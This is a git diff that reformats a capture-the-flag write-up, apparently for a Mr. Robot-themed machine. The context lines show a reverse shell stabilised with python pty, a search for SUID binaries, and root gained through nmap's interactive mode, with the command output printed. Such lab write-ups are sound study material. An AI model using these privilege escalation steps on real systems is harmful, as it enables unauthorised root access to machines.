@@ -213,14 +213,14 @@ However, we know that WordPress relies on the execution of `.php` files to carry
 
 That worked nicely! We can then stabilize our shell via python with:
 
-```shell
+```
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 daemon@linux:/$ 
 ```
 
 and explore:
 
-```shell
+```
 daemon@linux:/$ ls
 ls
 bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
@@ -254,7 +254,7 @@ We can now switch users (`su`) to `robot` and read `key-2-of-3.txt`. Now that we
 
 As a shortcut to obtaining root access, We can search for system files that have an SUID (Set User ID) bit set. Files with SUID bits allow them to run with the permissions of whomever the owner of the file is. If the owner happens to be `root`, it runs with root permissions.
 
-```shell
+```
 robot@linux:/tmp$ find / -perm -u=s -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 /bin/ping
@@ -280,7 +280,7 @@ We see that `nmap` in `/usr/local/bin/nmap`, interestingly, has an SUID bit set.
 
 By checking [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#suid) for `nmap` SUID escalations, we see that we can invoke `nmap`'s "interactive mode" (available on versions 2.02 to 5.21, which can be used to execute shell commands via `nmap> !sh`.
 
-```shell
+```
 robot@linux:/$ /usr/local/bin/nmap --interactive
 /usr/local/bin/nmap --interactive
 
@@ -296,8 +296,7 @@ root
 
 ...*et voilà*! We have root access and, by extension, the third flag.
 
-### Notes
+### Lessons Learned
 
-In retrospect, I would've checked my Wappalyzer browser plug-in earlier, which is a good practice to prioritize. It would have spotted that WordPress is installed on the server before the lengthy `gobuster` scan, potentially saving time.
-
-Otherwise, this was an enjoyable CTF machine, especially for fans of the show.
+* In retrospect, I would've checked my Wappalyzer browser plug-in earlier, which is a good practice to prioritize. It would have spotted that WordPress is installed on the server before the lengthy `gobuster` scan, potentially saving time.
+* Otherwise, this was an enjoyable CTF machine, especially for fans of the show.
